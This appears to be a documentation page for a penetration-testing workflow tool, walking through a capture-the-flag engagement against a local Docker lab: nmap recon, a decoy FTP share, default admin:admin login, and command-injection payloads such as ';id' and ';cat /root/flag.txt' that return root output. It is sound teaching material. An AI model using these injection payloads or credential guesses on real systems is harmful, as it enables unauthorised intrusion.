@@ -1,0 +1,398 @@
+---
+title: "Simple Lab Tutorial"
+description: "Walk through a full penetration test against a vulnerable lab using Redtrail — from recon to flag capture in ~30 minutes."
+---
+
+import TerminalFrame from '../../../../components/TerminalFrame.astro';
+
+This tutorial walks you through a complete engagement against a deliberately vulnerable lab environment. You will use RT to manage your recon, track hypotheses, follow dead ends, and ultimately capture the flag — the same workflow you'd use on a real target.
+
+**Time:** ~30 minutes hands-on.
+
+**Prerequisites:** RT [installed](/en/getting-started/installation/) and configured (`rt setup` completed), Docker and Docker Compose available.
+
+## 1. Spin up the lab
+
+The simple lab is a single container running three services: HTTP, FTP, and SSH. From the project root:
+
+<TerminalFrame title="bash">
+```
+$ cd docs-site/labs/simple
+$ docker compose up -d --build
+[+] Building 12.3s (9/9) FINISHED
+[+] Running 1/1
+ ✔ Container simple-target-1  Started
+```
+</TerminalFrame>
+
+Verify the container is running:
+
+<TerminalFrame title="bash">
+```
+$ docker compose ps
+NAME               STATUS    PORTS
+simple-target-1    Up        0.0.0.0:21-22->21-22/tcp, 0.0.0.0:80->80/tcp
+```
+</TerminalFrame>
+
+Your target is now live on `localhost`. Ports 21 (FTP), 22 (SSH), and 80 (HTTP) are exposed.
+
+## 2. Initialize the RT workspace
+
+Create a fresh workspace for this engagement:
+
+<TerminalFrame title="bash">
+```
+$ mkdir simple-lab && cd simple-lab
+$ rt init --target 127.0.0.1 --goal ctf --scope 127.0.0.1/32
+[+] Workspace initialized: simple-lab
+[+] Target: 127.0.0.1
+[+] Goal: ctf
+[+] Scope: 127.0.0.1/32
+[+] Session: sess_7f3a1b
+[+] Database: .rt/redtrail.db
+```
+</TerminalFrame>
+
+Activate the RT environment so commands get captured automatically:
+
+<TerminalFrame title="bash">
+```
+$ eval "$(rt env)"
+[rt:simple-lab] $
+```
+</TerminalFrame>
+
+## 3. Recon — scan the target
+
+Start with a service version scan. RT intercepts the nmap call, captures its output, and extracts findings into the knowledge base:
+
+<TerminalFrame title="nmap — 127.0.0.1">
+```
+[rt:simple-lab] $ nmap -sV -sC 127.0.0.1
+Starting Nmap 7.94 ( https://nmap.org )
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed
+|   pub/backup.sql.gz
+|   pub/credentials.txt
+22/tcp open  ssh     OpenSSH 9.2p1 Debian
+80/tcp open  http    Werkzeug/3.0 Python/3.12
+|_http-title: NetPanel - Login
+Nmap done: 1 IP host up scanned in 8.42 seconds
+
+[rt] captured → 1 host, 3 ports, 2 service fingerprints
+```
+</TerminalFrame>
+
+Three open ports. Anonymous FTP with visible files, SSH, and a web app called "NetPanel". Let's see what RT collected:
+
+<TerminalFrame title="rt kb">
+```
+[rt:simple-lab] $ rt kb hosts
+HOST        OS              PORTS  FIRST SEEN
+127.0.0.1   Linux (Debian)  3      just now
+
+[rt:simple-lab] $ rt kb ports --host 127.0.0.1
+HOST       PORT  PROTO  SERVICE  VERSION              STATE
+127.0.0.1  21    tcp    ftp      vsftpd 3.0.5         open
+127.0.0.1  22    tcp    ssh      OpenSSH 9.2p1        open
+127.0.0.1  80    tcp    http     Werkzeug/3.0 Py3.12  open
+```
+</TerminalFrame>
+
+## 4. The FTP red herring
+
+Anonymous FTP with files called `backup.sql.gz` and `credentials.txt`? That screams "look here first." Let's investigate — but track our thinking as a hypothesis so we have an audit trail.
+
+### Form the hypothesis
+
+<TerminalFrame title="rt hypothesis">
+```
+[rt:simple-lab] $ rt hypothesis create \
+    "FTP anonymous files contain valid credentials for other services" \
+    --category auth \
+    --priority high \
+    --confidence 0.7 \
+    --component 127.0.0.1:21
+[+] Hypothesis #1 created (status: pending)
+```
+</TerminalFrame>
+
+**Why track this?** Even dead ends are valuable. When you write the final report, you want to show the decision process — what you investigated, what you ruled out, and why.
+
+### Grab the FTP files
+
+<TerminalFrame title="ftp — 127.0.0.1">
+```
+[rt:simple-lab] $ ftp -a 127.0.0.1
+Connected to 127.0.0.1.
+230 Login successful.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> ls
+-rw-r--r--  1 ftp ftp  1024 Mar 15 00:00 backup.sql.gz
+-rw-r--r--  1 ftp ftp   182 Mar 15 00:00 credentials.txt
+ftp> get backup.sql.gz
+ftp> get credentials.txt
+ftp> bye
+
+[rt] captured → 2 files downloaded via FTP
+```
+</TerminalFrame>
+
+### Inspect the evidence
+
+<TerminalFrame title="bash">
+```
+[rt:simple-lab] $ cat credentials.txt
+## Internal credentials - EXPIRED 2024-01-15 ##
+## DO NOT USE - accounts have been rotated ##
+
+admin:Summer2023!
+dbadmin:Passw0rd123
+deploy:d3pl0y_2023_temp
+jenkins:j3nk1ns_b00t
+
+[rt:simple-lab] $ file backup.sql.gz
+backup.sql.gz: data
+```
+</TerminalFrame>
+
+The credentials file screams expired. The "backup" file is junk data — not a valid gzip archive. Classic decoy.
+
+### Log the evidence and refute
+
+Record what we found and update the hypothesis:
+
+<TerminalFrame title="rt evidence">
+```
+[rt:simple-lab] $ rt evidence add \
+    --hypothesis 1 \
+    --type contra \
+    --content "credentials.txt header says EXPIRED 2024-01-15, accounts rotated. backup.sql.gz is junk data (not valid gzip)."
+[+] Evidence #1 added to hypothesis #1
+
+[rt:simple-lab] $ rt hypothesis update 1 --status refuted
+[+] Hypothesis #1 → refuted
+```
+</TerminalFrame>
+
+**Takeaway:** The FTP share was a rabbit hole. In a real engagement, documenting dead ends saves you from revisiting them and shows thoroughness in your report.
+
+## 5. Pivot to the web application
+
+Let's ask RT for guidance now that FTP is a dead end:
+
+<TerminalFrame title="rt ask">
+```
+[rt:simple-lab] $ rt ask "FTP was a decoy. What should I try next?"
+[*] Sending context: 1 host, 3 ports, 1 hypothesis (refuted), 5 commands...
+
+Based on your session:
+
+1. **Investigate the web app on port 80** (highest priority)
+   → The NetPanel login page is the most promising attack surface.
+   Try default/common credentials: admin:admin, admin:password
+   Priority: HIGH
+
+2. **SSH brute force as fallback**
+   → Only if web app yields nothing. Check for weak passwords.
+   Priority: LOW — try web app first
+```
+</TerminalFrame>
+
+The LLM has full context: it knows FTP was refuted and steers us to the web app. Let's follow that advice.
+
+## 6. Discover default web credentials
+
+Create a new hypothesis for the web path:
+
+<TerminalFrame title="rt hypothesis">
+```
+[rt:simple-lab] $ rt hypothesis create \
+    "NetPanel web app uses default credentials" \
+    --category auth \
+    --priority high \
+    --confidence 0.5 \
+    --component 127.0.0.1:80
+[+] Hypothesis #2 created (status: pending)
+```
+</TerminalFrame>
+
+Test the most common default — `admin:admin`:
+
+<TerminalFrame title="curl — 127.0.0.1:80">
+```
+[rt:simple-lab] $ curl -v -X POST http://127.0.0.1/ \
+    -d "username=admin&password=admin" \
+    -c cookies.txt -L
+< HTTP/1.1 302 FOUND
+< Location: /admin
+> GET /admin HTTP/1.1
+< HTTP/1.1 200 OK
+<html>
+  <title>NetPanel - Admin</title>
+  ...Network Diagnostics...
+  ...Host to ping...
+</html>
+
+[rt] captured → HTTP 302 redirect to /admin (auth success)
+```
+</TerminalFrame>
+
+We're in. Default creds worked. Log the evidence:
+
+<TerminalFrame title="rt evidence">
+```
+[rt:simple-lab] $ rt evidence add \
+    --hypothesis 2 \
+    --type supporting \
+    --content "admin:admin grants access to /admin panel. HTTP 302 redirect confirms auth success."
+[+] Evidence #2 added to hypothesis #2
+
+[rt:simple-lab] $ rt hypothesis update 2 --status confirmed
+[+] Hypothesis #2 → confirmed
+```
+</TerminalFrame>
+
+## 7. Find the command injection
+
+The admin panel has a "Network Diagnostics" feature — a form that pings a host. Any time user input feeds into a system command, command injection is worth testing.
+
+<TerminalFrame title="rt hypothesis">
+```
+[rt:simple-lab] $ rt hypothesis create \
+    "NetPanel ping diagnostic is vulnerable to OS command injection" \
+    --category vuln \
+    --priority critical \
+    --confidence 0.6 \
+    --component 127.0.0.1:80/admin
+[+] Hypothesis #3 created (status: pending)
+```
+</TerminalFrame>
+
+Test with a simple command separator:
+
+<TerminalFrame title="curl — command injection test">
+```
+[rt:simple-lab] $ curl -s -X POST http://127.0.0.1/admin \
+    -b cookies.txt \
+    -d "host=127.0.0.1;id"
+...
+<div class="output">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms
+
+uid=0(root) gid=0(root) groups=0(root)
+</div>
+
+[rt] captured → HTTP POST to /admin with injection payload
+```
+</TerminalFrame>
+
+The `id` command executed — and the app runs as **root**. This is a critical finding.
+
+<TerminalFrame title="rt evidence">
+```
+[rt:simple-lab] $ rt evidence add \
+    --hypothesis 3 \
+    --type supporting \
+    --content "Injecting ;id after ping input returns uid=0(root). Full RCE as root confirmed."
+[+] Evidence #3 added to hypothesis #3
+
+[rt:simple-lab] $ rt hypothesis update 3 --status confirmed
+[+] Hypothesis #3 → confirmed
+```
+</TerminalFrame>
+
+## 8. Capture the flag
+
+With root-level command execution, grab the flag:
+
+<TerminalFrame title="curl — flag capture">
+```
+[rt:simple-lab] $ curl -s -X POST http://127.0.0.1/admin \
+    -b cookies.txt \
+    -d "host=;cat /root/flag.txt"
+...
+<div class="output">FLAG{r3dtr41l_s1mpl3_l4b_pwn3d}
+</div>
+
+[rt] captured → flag extracted via command injection
+```
+</TerminalFrame>
+
+Record the flag:
+
+<TerminalFrame title="rt flag">
+```
+[rt:simple-lab] $ rt flag add "FLAG{r3dtr41l_s1mpl3_l4b_pwn3d}" \
+    --source "command injection via /admin ping diagnostic" \
+    --host 127.0.0.1
+[+] Flag captured: FLAG{r3dtr41l_s1mpl3_l4b_pwn3d}
+```
+</TerminalFrame>
+
+## 9. Generate the engagement report
+
+With the flag captured, generate the full report narrative:
+
+<TerminalFrame title="rt report">
+```
+[rt:simple-lab] $ rt report generate --output report.md
+[*] Generating report from session sess_7f3a1b...
+[+] Hosts: 1 | Ports: 3 | Hypotheses: 3 | Evidence: 3 | Flags: 1
+[+] Report written to report.md
+```
+</TerminalFrame>
+
+The report includes everything: discovered services, the FTP dead end with refutation evidence, the confirmed web credential and injection vulnerabilities, the flag capture, and a full command timeline.
+
+<TerminalFrame title="rt status">
+```
+[rt:simple-lab] $ rt status
+Session:      sess_7f3a1b
+Target:       127.0.0.1
+Goal:         ctf
+Scope:        127.0.0.1/32
+Duration:     00:24:17
+
+Hosts:        1
+Ports:        3
+Credentials:  1
+Flags:        1
+Hypotheses:   3 (confirmed: 2, refuted: 1)
+Commands:     14
+```
+</TerminalFrame>
+
+## 10. Tear down
+
+Clean up when you're done:
+
+<TerminalFrame title="bash">
+```
+$ cd docs-site/labs/simple
+$ docker compose down
+[+] Running 1/1
+ ✔ Container simple-target-1  Removed
+```
+</TerminalFrame>
+
+## What you practiced
+
+| Skill | RT feature used |
+|-------|----------------|
+| Service enumeration | `nmap` → `rt kb hosts/ports` |
+| Hypothesis-driven testing | `rt hypothesis create/update` |
+| Documenting dead ends | `rt evidence add --type contra` |
+| LLM-assisted pivoting | `rt ask` with full session context |
+| Credential testing | `curl` + `rt evidence add --type supporting` |
+| Vulnerability exploitation | Command injection → `rt flag add` |
+| Engagement reporting | `rt report generate` |
+
+## Next steps
+
+- [Core Concepts](/en/core-concepts/overview/) — understand deductive layers (L0–L4) and the BISCL framework
+- [CLI Reference](/en/cli-reference/commands/) — full list of `rt` subcommands and flags
+- [Getting Started](/en/getting-started/quickstart/) — quick-reference for RT commands
